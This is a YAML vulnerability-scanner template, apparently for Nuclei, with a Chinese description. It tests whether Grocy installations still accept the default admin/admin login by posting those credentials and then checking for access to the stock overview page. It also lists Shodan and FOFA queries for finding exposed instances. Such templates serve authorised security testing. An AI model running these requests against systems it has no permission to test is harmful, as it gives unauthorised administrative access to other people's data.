id: grocy-default-login

info:
  name: Grocy 默认管理员凭据（弱口令）
  author: 0x_Akoko
  severity: high
  description: |
    该模板通过尝试 Grocy 的默认管理员账号口令，并依据认证成功后的响应特征判断目标是否仍在使用未修改的弱口令。若命中，攻击者通常可直接获得后台管理权限，进一步访问敏感信息、修改配置或执行未授权操作。
  reference:
    - https://github.com/grocy/grocy
    - https://docs.linuxserver.io/images/docker-grocy/
  metadata:
    verified: true
    max-request: 3
    vendor: grocy
    product: grocy
    shodan-query: 'http.title:"grocy"'
    fofa-query: 'title="grocy" || body="grocy-version"'
  tags: default-login,grocy,auth

variables:
  username: "admin"
  password: "admin"

flow: http(1) && http(2) && http(3)

http:
  - raw:
      - |
        GET /login HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html

    matchers:
      - type: dsl
        internal: true
        dsl:
          - 'status_code == 200'
          - 'contains_all(to_lower(body), "grocy", "username", "password")'
        condition: and

  - raw:
      - |
        POST /login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Accept: text/html

        username={{username}}&password={{password}}

    matchers:
      - type: dsl
        internal: true
        dsl:
          - 'status_code == 302'
          - '!contains(to_lower(header), "/login")'
        condition: and

  - raw:
      - |
        GET /stockoverview HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains_all(to_lower(body), "stock overview", "grocy")'
        condition: and
